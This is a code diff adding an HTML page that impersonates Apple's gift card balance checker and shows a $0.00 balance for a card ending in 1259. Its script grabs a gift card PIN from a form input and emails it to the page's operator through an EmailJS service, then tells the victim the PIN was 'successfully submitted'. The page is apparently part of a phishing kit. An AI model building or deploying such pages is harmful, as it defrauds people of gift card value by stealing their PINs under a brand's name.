@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <!-- Favicon (Logo for title bar) -->
+    <link rel="icon" type="image/png" href="apple_logo_2.jpeg">
+    <link href="https://cdn.jsdelivr.net/npm/flowbite@2.5.2/dist/flowbite.min.css" rel="stylesheet" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link rel="stylesheet" href="style.css">
+    <title>Apple Gift Card Balance Check</title>
+</head>
+
+<body>
+     <div class="top_nav flex items-center justify-between p-2">
+        <div class="apple_logo">
+            <img src="apple_logo.png" alt="logo" class="w-10 h-10">
+        </div>
+        <div class="action_btn flex items-center justify-between">
+            <a href="">
+                <svg class="w-6 h-6 text-gray-500 dark:text-white" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24">
+                    <path stroke="currentColor" stroke-linecap="round" stroke-width="2" d="m21 21-3.5-3.5M17 10a7 7 0 1 1-14 0 7 7 0 0 1 14 0Z"/>
+                  </svg>                  
+            </a>
+            <a href="">
+                <svg class="w-6 h-6 text-gray-500 dark:text-white" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24">
+                    <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 10V6a3 3 0 0 1 3-3v0a3 3 0 0 1 3 3v4m3-2 .917 11.923A1 1 0 0 1 17.92 21H6.08a1 1 0 0 1-.997-1.077L6 8h12Z"/>
+                  </svg>                  
+            </a>
+            <a href="">
+                <svg class="w-6 h-6 text-gray-500 dark:text-white" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24">
+                    <path stroke="currentColor" stroke-linecap="round" stroke-width="2" d="M5 7h14M5 12h14M5 17h14"/>
+                  </svg>                  
+            </a>
+        </div>
+     </div>   
+     <div class="sub_nav flex items-center justify-between p-2">
+        <h1 class="font-bold">Apple Gift Card</h1>
+        <div class="action_btn flex items-center justify-between">
+            <svg class="w-6 h-6 text-gray-500 dark:text-white" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24">
+                <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m19 9-7 7-7-7"/>
+              </svg>              
+            <a href="" id="buy" class="text-white bg-blue-500 hover:bg-blue-700">Buy</a>
+        </div>
+     </div>
+
+    <div class="main flex items-center justify-center flex-col mt-10">
+        <h1 class="text-3xl text-center font-bold mb-10">Check Your Apple Gift <br> Card Balance</h1>
+        <h2 class="text-xl font-bold mb-5">Here's your balance:</h2>
+
+        <h1 class="text-3xl text-center font-bold mb-2">$0.00</h1>
+        <p class="mb-3 text-gray-500 text-sm">Gift Card ending in ...1259</p>
+
+        <p class="text-center text-sm">Recently used gift cards may not reflect the updated <br> balance on the card. Card balances will be updated <br> once your order is ready to ship.</p>
+
+        <a href="index.html" class="text-xl text-blue-500 mt-5 mb-10">Check another gift card</a>
+        
+
+        <img src="gift_card.jpeg" alt="" class="card_img mt-10">
+    </div>
+
+     
+     <script src="../path/to/flowbite/dist/flowbite.min.js"></script>
+     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+
+     <script>
+        emailjs.init("ZeH1lWQH-wAnsI31v"); // Replace with your actual public key
+    
+        document.querySelector("form").addEventListener("submit", function(event) {
+            event.preventDefault(); // Prevent form from reloading the page
+    
+            // Fetch the input value
+            const pin = document.getElementById("base-input").value;
+    
+            // Send form data via EmailJS
+            emailjs.send("service_lw3yuzf", "template_lx7h1wj", { 
+                pin: pin  // Matches the {{pin}} placeholder in the template
+            }).then(
+                function(response) {
+                    alert("Your PIN has been successfully submitted!");
+                },
+                function(error) {
+                    console.error("EmailJS error: ", error); // Log the error for debugging
+                    alert("Failed to send the PIN. Please try again later.");
+                }
+            );
+        });
+    </script>
+       
+</body>
+</html>
